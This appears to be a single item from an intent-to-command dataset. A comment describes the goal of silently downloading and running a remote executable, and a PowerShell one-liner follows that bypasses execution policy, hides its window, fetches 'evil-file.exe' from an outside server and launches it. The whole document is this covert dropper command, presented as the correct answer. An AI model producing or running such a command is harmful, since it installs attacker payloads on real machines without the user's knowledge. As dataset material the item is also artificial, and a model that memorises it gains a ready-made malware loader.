# Natural language intent:
# Download and execute an executable file from a remote URL, hiding the PowerShell window.

powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'http://heavy-server.site.com/evil-file.exe' -OutFile 'evil-file.exe'; Start-Process 'evil-file.exe'"
